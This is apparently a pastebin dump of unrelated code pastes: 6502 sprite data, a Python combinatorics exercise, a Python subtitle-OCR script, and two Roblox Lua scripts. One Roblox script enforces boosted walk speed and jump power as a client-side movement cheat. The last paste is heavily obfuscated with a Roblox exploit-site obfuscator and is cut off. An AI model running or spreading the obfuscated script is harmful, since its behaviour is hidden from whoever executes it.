        .byte $06,$06,$06,$06,$06,$0d,$0d,$0d,$0d,$0d,$06,$06,$00
        .byte $00,$06,$06,$06,$06,$06,$0e,$0e,$0e,$0e,$0e,$06,$06
        .byte $00,$00,$06,$06,$06,$06,$06,$0f,$0f,$0f,$0f,$0f,$06
        .byte $00,$00,$00,$06,$06,$06,$06,$06,$0c,$0c,$0c,$0c,$0c

escalator_2:
        .byte $0c,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $03,$03,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $07,$07,$07,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $05,$05,$05,$05,$06,$06,$00,$00,$00,$00,$00,$00,$00
        .byte $04,$04,$04,$04,$04,$06,$06,$00,$00,$00,$00,$00,$00
        .byte $06,$02,$02,$02,$02,$02,$06,$06,$00,$00,$00,$00,$00
        .byte $06,$06,$01,$01,$01,$01,$01,$06,$06,$00,$00,$00,$00
        .byte $06,$06,$06,$08,$08,$08,$08,$08,$06,$06,$00,$00,$00
        .byte $06,$06,$06,$06,$09,$09,$09,$09,$09,$06,$06,$00,$00
        .byte $06,$06,$06,$06,$06,$0a,$0a,$0a,$0a,$0a,$06,$06,$00
        .byte $00,$06,$06,$06,$06,$06,$0d,$0d,$0d,$0d,$0d,$06,$06
        .byte $00,$00,$06,$06,$06,$06,$06,$0e,$0e,$0e,$0e,$0e,$06
        .byte $00,$00,$00,$06,$06,$06,$06,$06,$0f,$0f,$0f,$0f,$0f

escalator_3:
        .byte $0f,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0c,$0c,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $03,$03,$03,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $07,$07,$07,$07,$06,$06,$00,$00,$00,$00,$00,$00,$00
        .byte $05,$05,$05,$05,$05,$06,$06,$00,$00,$00,$00,$00,$00
        .byte $06,$04,$04,$04,$04,$04,$06,$06,$00,$00,$00,$00,$00
        .byte $06,$06,$02,$02,$02,$02,$02,$06,$06,$00,$00,$00,$00
        .byte $06,$06,$06,$01,$01,$01,$01,$01,$06,$06,$00,$00,$00
        .byte $06,$06,$06,$06,$08,$08,$08,$08,$08,$06,$06,$00,$00
        .byte $06,$06,$06,$06,$06,$09,$09,$09,$09,$09,$06,$06,$00
        .byte $00,$06,$06,$06,$06,$06,$0a,$0a,$0a,$0a,$0a,$06,$06
        .byte $00,$00,$06,$06,$06,$06,$06,$0d,$0d,$0d,$0d,$0d,$06
        .byte $00,$00,$00,$06,$06,$06,$06,$06,$0e,$0e,$0e,$0e,$0e

escalator_4:
        .byte $0e,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0f,$0f,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0c,$0c,$0c,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $03,$03,$03,$03,$06,$06,$00,$00,$00,$00,$00,$00,$00
        .byte $07,$07,$07,$07,$07,$06,$06,$00,$00,$00,$00,$00,$00
        .byte $06,$05,$05,$05,$05,$05,$06,$06,$00,$00,$00,$00,$00
        .byte $06,$06,$04,$04,$04,$04,$04,$06,$06,$00,$00,$00,$00
        .byte $06,$06,$06,$02,$02,$02,$02,$02,$06,$06,$00,$00,$00
        .byte $06,$06,$06,$06,$01,$01,$01,$01,$01,$06,$06,$00,$00
        .byte $06,$06,$06,$06,$06,$08,$08,$08,$08,$08,$06,$06,$00
        .byte $00,$06,$06,$06,$06,$06,$09,$09,$09,$09,$09,$06,$06
        .byte $00,$00,$06,$06,$06,$06,$06,$0a,$0a,$0a,$0a,$0a,$06
        .byte $00,$00,$00,$06,$06,$06,$06,$06,$0d,$0d,$0d,$0d,$0d

escalator_5:
        .byte $0d,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0e,$0e,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0f,$0f,$0f,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0c,$0c,$0c,$0c,$06,$06,$00,$00,$00,$00,$00,$00,$00
        .byte $03,$03,$03,$03,$03,$06,$06,$00,$00,$00,$00,$00,$00
        .byte $06,$07,$07,$07,$07,$07,$06,$06,$00,$00,$00,$00,$00
        .byte $06,$06,$05,$05,$05,$05,$05,$06,$06,$00,$00,$00,$00
        .byte $06,$06,$06,$04,$04,$04,$04,$04,$06,$06,$00,$00,$00
        .byte $06,$06,$06,$06,$02,$02,$02,$02,$02,$06,$06,$00,$00
        .byte $06,$06,$06,$06,$06,$01,$01,$01,$01,$01,$06,$06,$00
        .byte $00,$06,$06,$06,$06,$06,$08,$08,$08,$08,$08,$06,$06
        .byte $00,$00,$06,$06,$06,$06,$06,$09,$09,$09,$09,$09,$06
        .byte $00,$00,$00,$06,$06,$06,$06,$06,$0a,$0a,$0a,$0a,$0a

escalator_6:
        .byte $0a,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0d,$0d,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0e,$0e,$0e,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0f,$0f,$0f,$0f,$06,$06,$00,$00,$00,$00,$00,$00,$00
        .byte $0c,$0c,$0c,$0c,$0c,$06,$06,$00,$00,$00,$00,$00,$00
        .byte $06,$03,$03,$03,$03,$03,$06,$06,$00,$00,$00,$00,$00
        .byte $06,$06,$07,$07,$07,$07,$07,$06,$06,$00,$00,$00,$00
        .byte $06,$06,$06,$05,$05,$05,$05,$05,$06,$06,$00,$00,$00
        .byte $06,$06,$06,$06,$04,$04,$04,$04,$04,$06,$06,$00,$00
        .byte $06,$06,$06,$06,$06,$02,$02,$02,$02,$02,$06,$06,$00
        .byte $00,$06,$06,$06,$06,$06,$01,$01,$01,$01,$01,$06,$06
        .byte $00,$00,$06,$06,$06,$06,$06,$08,$08,$08,$08,$08,$06
        .byte $00,$00,$00,$06,$06,$06,$06,$06,$09,$09,$09,$09,$09

escalator_7:
        .byte $09,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0a,$0a,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0d,$0d,$0d,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0e,$0e,$0e,$0e,$06,$06,$00,$00,$00,$00,$00,$00,$00
        .byte $0f,$0f,$0f,$0f,$0f,$06,$06,$00,$00,$00,$00,$00,$00
        .byte $06,$0c,$0c,$0c,$0c,$0c,$06,$06,$00,$00,$00,$00,$00
        .byte $06,$06,$03,$03,$03,$03,$03,$06,$06,$00,$00,$00,$00
        .byte $06,$06,$06,$07,$07,$07,$07,$07,$06,$06,$00,$00,$00
        .byte $06,$06,$06,$06,$05,$05,$05,$05,$05,$06,$06,$00,$00
        .byte $06,$06,$06,$06,$06,$04,$04,$04,$04,$04,$06,$06,$00
        .byte $00,$06,$06,$06,$06,$06,$02,$02,$02,$02,$02,$06,$06
        .byte $00,$00,$06,$06,$06,$06,$06,$01,$01,$01,$01,$01,$06
        .byte $00,$00,$00,$06,$06,$06,$06,$06,$08,$08,$08,$08,$08

escalator_8:
        .byte $08,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $09,$09,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0a,$0a,$0a,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0d,$0d,$0d,$0d,$06,$06,$00,$00,$00,$00,$00,$00,$00
        .byte $0e,$0e,$0e,$0e,$0e,$06,$06,$00,$00,$00,$00,$00,$00
        .byte $06,$0f,$0f,$0f,$0f,$0f,$06,$06,$00,$00,$00,$00,$00
        .byte $06,$06,$0c,$0c,$0c,$0c,$0c,$06,$06,$00,$00,$00,$00
        .byte $06,$06,$06,$03,$03,$03,$03,$03,$06,$06,$00,$00,$00
        .byte $06,$06,$06,$06,$07,$07,$07,$07,$07,$06,$06,$00,$00
        .byte $06,$06,$06,$06,$06,$05,$05,$05,$05,$05,$06,$06,$00
        .byte $00,$06,$06,$06,$06,$06,$04,$04,$04,$04,$04,$06,$06
        .byte $00,$00,$06,$06,$06,$06,$06,$02,$02,$02,$02,$02,$06
        .byte $00,$00,$00,$06,$06,$06,$06,$06,$01,$01,$01,$01,$01

escalator_9:
        .byte $01,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $08,$08,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $09,$09,$09,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0a,$0a,$0a,$0a,$06,$06,$00,$00,$00,$00,$00,$00,$00
        .byte $0d,$0d,$0d,$0d,$0d,$06,$06,$00,$00,$00,$00,$00,$00
        .byte $06,$0e,$0e,$0e,$0e,$0e,$06,$06,$00,$00,$00,$00,$00
        .byte $06,$06,$0f,$0f,$0f,$0f,$0f,$06,$06,$00,$00,$00,$00
        .byte $06,$06,$06,$0c,$0c,$0c,$0c,$0c,$06,$06,$00,$00,$00
        .byte $06,$06,$06,$06,$03,$03,$03,$03,$03,$06,$06,$00,$00
        .byte $06,$06,$06,$06,$06,$07,$07,$07,$07,$07,$06,$06,$00
        .byte $00,$06,$06,$06,$06,$06,$05,$05,$05,$05,$05,$06,$06
        .byte $00,$00,$06,$06,$06,$06,$06,$04,$04,$04,$04,$04,$06
        .byte $00,$00,$00,$06,$06,$06,$06,$06,$02,$02,$02,$02,$02

escalator_10:
        .byte $02,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $01,$01,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $08,$08,$08,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $09,$09,$09,$09,$06,$06,$00,$00,$00,$00,$00,$00,$00
        .byte $0a,$0a,$0a,$0a,$0a,$06,$06,$00,$00,$00,$00,$00,$00
        .byte $06,$0d,$0d,$0d,$0d,$0d,$06,$06,$00,$00,$00,$00,$00
        .byte $06,$06,$0e,$0e,$0e,$0e,$0e,$06,$06,$00,$00,$00,$00
        .byte $06,$06,$06,$0f,$0f,$0f,$0f,$0f,$06,$06,$00,$00,$00
        .byte $06,$06,$06,$06,$0c,$0c,$0c,$0c,$0c,$06,$06,$00,$00
        .byte $06,$06,$06,$06,$06,$03,$03,$03,$03,$03,$06,$06,$00
        .byte $00,$06,$06,$06,$06,$06,$07,$07,$07,$07,$07,$06,$06
        .byte $00,$00,$06,$06,$06,$06,$06,$05,$05,$05,$05,$05,$06
        .byte $00,$00,$00,$06,$06,$06,$06,$06,$04,$04,$04,$04,$04


; Sprite data (63 bytes)
; flag
sprite0_data:
    	.byte 0,0,0,0,0,0,0,0,0,8,0,0,10,0,32,11
    	.byte 128,160,11,170,160,11,170,160,10,170,160,10,170,160,10,170
    	.byte 160,10,170,160,6,170,160,4,170,128,4,42,0,4,0,0
    	.byte 4,0,0,4,0,0,4,0,0,4,0,0,4,0,0

sprite1_data:
    	.byte 0,0,0,0,0,0,0,0,0,10,0,0,10,128,0,10
    	.byte 224,32,10,234,160,10,234,160,10,234,160,10,170,160,10,170
    	.byte 160,10,170,160,4,170,160,4,42,160,4,10,128,4,0,0
    	.byte 4,0,0,4,0,0,4,0,0,4,0,0,4,0,0

sprite2_data:
    	.byte 0,0,0,0,0,0,0,0,0,10,128,0,10,176,0,10
    	.byte 248,0,10,250,160,10,250,160,10,186,160,10,170,160,10,170
    	.byte 160,10,170,160,4,42,160,4,10,160,4,2,160,4,0,0
    	.byte 4,0,0,4,0,0,4,0,0,4,0,0,4,0,0

sprite3_data:
    	.byte 0,0,0,0,0,0,2,160,0,10,188,0,10,190,0,10
    	.byte 190,160,10,190,160,10,186,160,10,170,160,10,170,160,10,170
    	.byte 160,8,10,160,4,2,160,4,0,160,4,0,0,4,0,0
    	.byte 4,0,0,4,0,0,4,0,0,4,0,0,4,0,0

sprite4_data:
    	.byte 0,0,0,0,168,0,2,174,0,10,190,128,10,190,160,10
    	.byte 190,160,10,190,160,10,174,160,10,170,160,10,170,160,10,2
    	.byte 160,8,0,160,4,0,32,4,0,0,4,0,0,4,0,0
    	.byte 4,0,0,4,0,0,4,0,0,4,0,0,4,0,0

sprite5_data:
    	.byte 0,42,0,0,175,128,2,175,160,10,175,160,10,175,160,10
    	.byte 175,160,10,175,160,10,171,160,10,170,160,10,128,160,10,0
    	.byte 32,8,0,0,4,0,0,4,0,0,4,0,0,4,0,0
    	.byte 4,0,0,4,0,0,4,0,0,4,0,0,4,0,0

sprite6_data:
    	.byte 0,10,128,0,42,224,0,170,224,10,170,224,10,170,224,10
    	.byte 170,224,10,170,160,10,170,160,10,170,160,10,160,32,10,128
    	.byte 0,10,0,0,4,0,0,4,0,0,4,0,0,4,0,0
    	.byte 4,0,0,4,0,0,4,0,0,4,0,0,4,0,0

sprite7_data:
    	.byte 0,2,160,0,10,160,0,42,160,10,170,160,10,170,160,10
    	.byte 170,160,10,170,160,10,170,160,10,170,160,10,168,0,10,160
    	.byte 0,10,128,0,4,0,0,4,0,0,4,0,0,4,0,0
    	.byte 4,0,0,4,0,0,4,0,0,4,0,0,4,0,0

sprite8_data:
        .byte 0,0,0,0,0,160,0,2,160,8,10,160,10,170,160,10
        .byte 170,160,10,170,160,10,170,160,10,170,160,10,170,160,10,170
        .byte 0,10,168,0,6,160,0,4,0,0,4,0,0,4,0,0
        .byte 4,0,0,4,0,0,4,0,0,4,0,0,4,0,0

sprite9_data:
        .byte 0,0,0,0,0,0,0,0,32,8,0,160,10,2,160,10
        .byte 170,160,10,170,160,10,170,160,10,170,160,10,170,160,10,170
        .byte 160,10,170,128,6,170,0,4,168,0,4,0,0,4,0,0
        .byte 4,0,0,4,0,0,4,0,0,4,0,0,4,0,0



; standing person
sprite10_data:
    	.byte 0,60,0,0,126,0,0,126,0,0,126,0,0,60,0,0
    	.byte 0,0,0,255,0,1,255,128,1,255,128,1,255,128,0,126
    	.byte 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
    	.byte 0,231,0,0,0,0,0,0,0,0,0,0,0,0,0

sprite11_data:
    	.byte 0,0,0,0,0,0,0,0,0,0,0,0,0,66,0,0
    	.byte 60,0,0,0,0,0,0,0,0,0,0,0,0,0,1,129
    	.byte 128,1,129,128,0,0,0,0,0,0,0,0,0,0,0,0
    	.byte 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0

sprite12_data:
    	.byte 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
    	.byte 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
    	.byte 0,0,126,0,0,126,0,0,102,0,0,102,0,0,102,0
    	.byte 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0

; sitting person
sprite13_data:
    	.byte 0,60,0,0,126,0,0,66,0,0,66,0,0,0,0,0
    	.byte 0,0,0,255,0,1,255,128,1,255,128,1,189,128,1,189
    	.byte 128,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
    	.byte 1,195,128,0,0,0,0,0,0,0,0,0,0,0,0

sprite14_data:
    	.byte 0,0,0,0,0,0,0,24,0,0,60,0,0,126,0,0
    	.byte 60,0,0,0,0,0,0,0,0,0,0,0,66,0,0,66
    	.byte 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
    	.byte 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0

sprite15_data:
    	.byte 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
    	.byte 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
    	.byte 0,0,255,0,0,255,0,0,195,0,0,195,0,0,195,0
    	.byte 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
"
8efhz7GC,Tutorial,MrGluckingBall,Lua,Sunday 19th of October 2025 07:51:26 AM CDT,"--[[// Tutorial

Script by MrGluckingBall/Joe/R_MP6,
enjoy!

]]

local player = game.Players.LocalPlayer
local userInputService = game:GetService(""UserInputService"")
local RunService = game:GetService(""RunService"")

-- === Toggle These ===
speed = true
jump = true
-- ====================

local isUsingSetA = true

-- Animation Sets
local animSetA = {
	idle = ""rbxassetid://0"",
	walk = ""rbxassetid://0""
}

local animSetB = {
	idle = ""rbxassetid://0"", -- Change this
	walk = ""rbxassetid://0"" -- And this.
}

local currentSet = animSetA
local walkTrack, idleTrack
local runningConnection
local speedEnforcer
local jumpEnforcer

-- Apply animations and speed/jump if enabled
local function applyAnimations(character)
	local humanoid = character:WaitForChild(""Humanoid"")

	-- Reset old
	if walkTrack then walkTrack:Stop() end
	if idleTrack then idleTrack:Stop() end
	if runningConnection then runningConnection:Disconnect() end
	if speedEnforcer then speedEnforcer:Disconnect() end
	if jumpEnforcer then jumpEnforcer:Disconnect() end

	-- Enforce WalkSpeed
	if speed then
		humanoid.WalkSpeed = 34
		speedEnforcer = humanoid:GetPropertyChangedSignal(""WalkSpeed""):Connect(function()
			if humanoid.WalkSpeed ~= 34 then
				humanoid.WalkSpeed = 34
			end
		end)
	end

	-- Enforce JumpPower + JumpHeight
	if jump then
		humanoid.UseJumpPower = true
		humanoid.JumpPower = 75
		humanoid.JumpHeight = 7.2

		jumpEnforcer = RunService.Heartbeat:Connect(function()
			if humanoid and humanoid.Parent then
				if not humanoid.UseJumpPower then
					humanoid.UseJumpPower = true
				end
				if humanoid.JumpPower ~= 75 then
					humanoid.JumpPower = 75
				end
				if humanoid.JumpHeight ~= 7.2 then
					humanoid.JumpHeight = 7.2
				end
			end
		end)
	end

	-- Load animations
	local walkAnim = Instance.new(""Animation"")
	walkAnim.AnimationId = currentSet.walk
	walkTrack = humanoid:LoadAnimation(walkAnim)
	walkTrack.Looped = true

	local idleAnim = Instance.new(""Animation"")
	idleAnim.AnimationId = currentSet.idle
	idleTrack = humanoid:LoadAnimation(idleAnim)
	idleTrack.Looped = true

	runningConnection = humanoid.Running:Connect(function(speedVal)
		if speedVal > 0 then
			idleTrack:Stop()
			if not walkTrack.IsPlaying then walkTrack:Play() end
		else
			walkTrack:Stop()
			if not idleTrack.IsPlaying then idleTrack:Play() end
		end
	end)

	idleTrack:Play()
end

-- Tap toggle support
local lastTapTime = 0
local tapThreshold = 0.5
local function handleTouch(input)
	local tapped = input.Position
	local currentTime = tick()
	if currentTime - lastTapTime > tapThreshold then
		lastTapTime = currentTime
		local bufferArea = Rect.new(50, 50, 150, 150)
		if bufferArea:Contains(tapped) then
			isUsingSetA = not isUsingSetA
			currentSet = isUsingSetA and animSetA or animSetB
			if player.Character then
				applyAnimations(player.Character)
			end
		end
	end
end

-- GUI init
local function initializeGUI()
	if not player.PlayerGui:FindFirstChild(""AnimToggleGui"") then
		local screenGui = Instance.new(""ScreenGui"")
		screenGui.Name = ""AnimToggleGui""
		screenGui.ResetOnSpawn = false
		screenGui.IgnoreGuiInset = true
		screenGui.Parent = player:WaitForChild(""PlayerGui"")

		local button = Instance.new(""TextButton"")
		button.Size = UDim2.new(0, 120, 0, 40)
		button.Position = UDim2.new(1, -130, 0.5, -20) -- original position
		button.Text = ""TOGGLE ANIM""
		button.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		button.TextColor3 = Color3.fromRGB(255, 230, 180)
		button.Font = Enum.Font.GothamBold
		button.TextSize = 16
		button.AutoButtonColor = false
		button.Parent = screenGui

		local uicorner = Instance.new(""UICorner"")
		uicorner.CornerRadius = UDim.new(0, 4)
		uicorner.Parent = button

		local stroke = Instance.new(""UIStroke"")
		stroke.Color = Color3.fromRGB(120, 100, 60)
		stroke.Thickness = 1.8
		stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		stroke.Parent = button

		local shadow = Instance.new(""TextLabel"")
		shadow.Size = button.Size
		shadow.Position = UDim2.new(0, 1, 0, 1)
		shadow.BackgroundTransparency = 1
		shadow.Text = button.Text
		shadow.TextColor3 = Color3.fromRGB(0, 0, 0)
		shadow.Font = button.Font
		shadow.TextSize = button.TextSize
		shadow.ZIndex = button.ZIndex - 1
		shadow.Parent = button

		button.MouseEnter:Connect(function()
			button.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
		end)

		button.MouseLeave:Connect(function()
			button.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		end)

		button.MouseButton1Click:Connect(function()
			isUsingSetA = not isUsingSetA
			currentSet = isUsingSetA and animSetA or animSetB
			if player.Character then
				applyAnimations(player.Character)
			end
		end)

		userInputService.TouchStarted:Connect(handleTouch)
	end
end

-- Main
initializeGUI()
if player.Character then
	applyAnimations(player.Character)
end

player.CharacterAdded:Connect(function(character)
	currentSet = isUsingSetA and animSetA or animSetB
	applyAnimations(character)
end)"
4zSHvp1r,8,nq1s788,Python,Sunday 19th of October 2025 07:48:19 AM CDT,"#https://inf-ege.sdamgia.ru/problem?id=59686
alph = 'АГМНСТУ'
ind = 0
for q in alph:
    for w in alph:
        for e in alph:
            for r in alph:
                for t in alph:
                    for y in alph:
                        ind += 1
                        s = q + w + e + r + t + y
                        if s[0] != 'У' and s.count('М') == 2 and s.count('Г') <= 1:
                            print(ind)"
NhRqzMuZ,ocr.py,sbbjun,Python,Sunday 19th of October 2025 05:06:46 AM CDT,"# 下載VideoSubFinder, 改path_VideoSubFinder
# 裝CUDA 12.9
# pip install paddlepaddle-gpu -i https://www.paddlepaddle.org.cn/packages/nightly/cu129/
# pip install paddleocr

import os
import glob
import subprocess
import time
import argparse
import numpy as np
from PIL import Image
from paddleocr import PaddleOCR

path_VideoSubFinder = r""D:\work\workspace\SubtitleOCR\VideoSubFinder""
fn_VideoSubFinder = ""VideoSubFinderWXW_intel.exe""
path_VideoSubFinder_exe = fr""{path_VideoSubFinder}\{fn_VideoSubFinder}""
path_sub_images = fr""{path_VideoSubFinder}\RGBImages""

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--image', required=False, help='image file path')
parser.add_argument('-v', '--video', required=False, help='video file path')
parser.add_argument('-te', '--sub_top', type=float, default=0.15, help='top of subtitle, percent offset of height, from bottom. (default=0.15)')
parser.add_argument('-be', '--sub_bottom', type=float, default=0.05, help='bottom of subtitle, percent offset of height, from bottom. (default=0.05)')
parser.add_argument('-mw', '--ocr_min_width', type=int, default=100, help='ocr: minimum text width. (default=100)')
parser.add_argument('-mh', '--ocr_min_height', type=int, default=50, help='ocr: minimum text height. (default=50)')
args = parser.parse_args()

print(""Initializing PaddleOCR..."")
ocr = PaddleOCR(
    text_detection_model_name=""PP-OCRv5_server_det"",
    text_recognition_model_name=""PP-OCRv5_server_rec"",
    use_doc_orientation_classify=False,
    use_doc_unwarping=False,
    use_textline_orientation=False,
)

def do_ocr(img_path):
    try:
        img = np.array(Image.open(img_path).convert('RGB'))
    except Exception as e:
        print(f""[ERROR] Failed to open image {img_path}: {e}"")
        return """"

    result = ocr.predict(img)
    for res in result:
        if 'rec_texts' not in res or 'rec_polys' not in res:
            continue
        txts, polys = res['rec_texts'], res['rec_polys']
        kept_txts = []
        for txt, poly in zip(txts, polys):
            xs = [p[0] for p in poly]
            ys = [p[1] for p in poly]
            width, height = max(xs) - min(xs), max(ys) - min(ys)
            if height >= args.ocr_min_height and width >= args.ocr_min_width:
                kept_txts.append(txt)
        if kept_txts:
            return "" "".join(kept_txts)
    return """"

# If only an image is provided, do single OCR and exit
if args.image and not args.video:
    print(f""Performing OCR on image: {args.image}"")
    txt = do_ocr(args.image)
    print(txt)
    print(""Single image OCR complete."")
    exit(0)

if not args.video:
    print(""[ERROR] Missing required argument: -v/--video when not using -i/--image only."")
    exit(1)

# Step 1: Run VideoSubFinder
print(""Step 1: Running VideoSubFinder..."")
params = [path_VideoSubFinder_exe, '-uc', '-c', '-r', '-i', args.image or args.video, '-te', str(args.sub_top), '-be', str(args.sub_bottom)]
proc = subprocess.Popen(params)

print(""Waiting for VideoSubFinder to complete..."")
flag_first = True
path_sub_images_jpeg = os.path.join(path_sub_images, '*.jpeg')
while proc.poll() is None:
    time.sleep(3)
    jpegs = glob.glob(path_sub_images_jpeg)
    if jpegs:
        print(jpegs[-1], flush=True)
        if flag_first:
            os.startfile(jpegs[0])
            flag_first = False
print(""VideoSubFinder finished."")


# Step 2: Get subtitle image files
print(""Step 2: Collecting subtitle images..."")
imgs = sorted(glob.glob(os.path.join(path_sub_images, '*.jpeg')))
print(f""Found {len(imgs)} subtitle images."")

# Step 3: OCR each subtitle image and generate VTT
print(""Step 3: Performing OCR and writing .vtt file..."")
output_vtt = f""{args.video}.vtt""
with open(output_vtt, 'w', encoding='utf-8') as f:
    f.write(""WEBVTT\n\n"")
    for img in imgs:
        base = os.path.basename(img)
        parts = base.split('__')
        if len(parts) < 2:
            continue
        start, end = parts[0], parts[1].split('_000000')[0]
        start = start.replace('_', ':', 2).replace('_', '.')
        end = end.replace('_', ':', 2).replace('_', '.')
        txt = do_ocr(img)
        if not txt:
            continue
        print(f""[{time.strftime('%H%M%S')}] {start} --> {end}: {txt}"")
        f.write(f""{start} --> {end}\n{txt}\n\n"")

print(f""Subtitle extraction complete: {output_vtt}"")
"
pBj1CjcE,Gunung Meledak,yocky12k,Lua,Sunday 19th of October 2025 04:39:28 AM CDT,"--[[ v1.0.0 https://wearedevs.net/obfuscator ]] return(function(...)local d={""\052\066\120\118\051\115\111\103\050\051\090\061"";""\106\072\106\115"";""\057\043\086\052\077\080\079\076\101\099\079\110"",""\055\043\075\050\055\097\061\061"";""\102\072\116\110\122\104\090\050\120\056\105\061"";""\052\077\069\079\090\067\121\087\077\071\053\111\079\097\061\061"";""\076\066\087\079\075\109\088\100\088\071\109\082\052\082\051\068\089\107\116\085"";""\085\052\076\118\088\087\084\121\106\068\052\083\112\086\049\100\080\099\102\067\050\102\114\114\070\089\101\061"",""\057\103\101\052\120\043\121\116\071\099\112\112\057\114\118\120\051\075\098\061"",""\090\049\101\116\079\050\090\061"",""\067\070\075\055\119\072\116\052\056\083\105\052\068\105\110\065\053\051\075\102\072\102\074\121\115\090\107\109\104\108\081\121\112\089\084\106\099\122\061\061"";""\068\068\088\056\052\097\061\061"";""\057\097\116\049\078\112\048\106\074\067\061\061"",""\084\078\079\056\106\078\057\076\079\067\061\061"";""\105\115\079\101\121\097\061\061"",""\068\078\068\107\057\065\086\052\070\076\061\061"";""\097\043\070\121\068\080\079\119\047\065\057\049\070\043\098\072"",""\110\115\102\118\069\112\102\061"";""\118\065\116\078"";""\116\107\055\110\099\067\061\061"";""\069\053\100\075\114\098\098\047\073\104\050\109\109\069\122\061"";""\067\119\107\051\075\077\075\097\077\105\122\112\047\089\085\107\080\068\055\101\089\097\103\098\053\087\087\056\056\067\061\061"";""\084\088\078\073\074\075\088\080\055\090\115\106\120\097\061\061"",""\111\073\102\049\087\047\111\061"";""\104\074\100\072\073\120\105\112\113\110\114\061"";""\071\051\051\052\122\107\055\075\090\107\082\043\053\122\117\085\069\116\105\078\098\073\071\067\072\103\072\111\113\117\090\061"";""\101\051\073\090\118\079\109\069"",""\057\053\110\076\055\097\061\061"";""\119\121\086\103\101\076\061\061"",""\055\098\084\055\120\114\108\090\084\053\057\103\068\053\115\121\068\067\061\061"";""\049\066\052\076\098\053\119\109"",""\105\078\075\104\055\065\086\050"";""\065\053\108\071"";""\121\103\069\122\043\054\084\050\084\047\105\080\075\056\087\067\070\098\090\061"",""\081\090\111\057\073\049\100\068\103\115\121\053\117\104\110\107\106\108\055\110\082\112\098\061"";""\057\114\086\100\101\119\109\072\070\119\057\082\071\103\101\080\077\053\105\061"",""\098\066\087\113\111\097\071\121\118\067\061\061"",""\084\116\103\109\089\090\085\077\118\047\122\061"";""\107\089\117\089\051\076\061\061"";""\101\110\068\054\109\099\112\047\105\078\075\053\097\068\101\118"",""\118\068\055\098\087\122\061\061"";""\105\065\075\113\105\103\070\061"",""\081\090\111\050\076\076\061\061"",""\105\043\068\054\106\099\068\054\101\119\084\100\101\078\118\110"",""\050\117\068\055\118\076\061\061"",""\048\071\083\121\048\099\067\061"",""\080\110\067\114\068\111\098\084\076\076\061\061"",""\054\121\120\066\047\090\067\102\049\119\043\048\104\107\117\119\069\111\088\073\116\067\061\061"",""\110\087\051\122"";""\106\069\108\061"";""\083\110\097\072\120\097\061\061"";""\051\111\047\098\069\100\104\102\073\076\067\068\097\048\101\068\051\097\120\065\111\067\061\061"";""\087\085\118\114\111\082\112\081\109\076\109\115\097\104\114\061"",""\104\121\065\084\075\118\102\061"",""\119\105\047\112\107\090\090\061"",""\055\106\120\070\071\067\061\061"",""\073\067\061\061"",""\043\089\121\083\085\102\066\077\097\097\102\119\043\078\050\065"";""\051\114\107\101"",""\090\117\075\054\065\111\087\050\072\069\051\057\089\100\049\113\077\075\103\069\081\074\070\061"",""\104\115\100\111\111\076\061\061"",""\066\105\105\070\047\108\085\075\070\081\055\084\066\097\061\061"",""\116\089\057\069\057\079\057\116\090\104\122\061"",""\088\078\055\111\121\074\119\055\114\043\101\061"";""\097\054\055\052\101\099\121\110"";""\099\084\068\048"";""\106\110\097\052\079\068\079\081\051\068\079\072\051\103\079\110\084\097\061\061"",""\097\078\079\082\055\054\057\113\070\078\112\083\101\043\114\080\079\098\097\061"";""\065\068\043\097\075\106\121\071\073\099\069\075"",""\107\071\082\075\109\119\085\099"";""\069\051\078\054\077\076\061\061"",""\097\080\083\110\101\119\084\110\097\103\068\054\057\065\086\104"",""\103\110\117\075\053\109\048\054\085\074\080\066\110\054\051\074\051\085\087\078\109\076\061\061"",""\098\072\075\057\068\097\061\061"",""\051\104\099\109\090\110\122\061"",""\097\080\083\110\101\119\084\110\068\065\086\103\055\043\118\110"",""\086\055\113\077\121\084\081\111\088\122\050\082"",""\0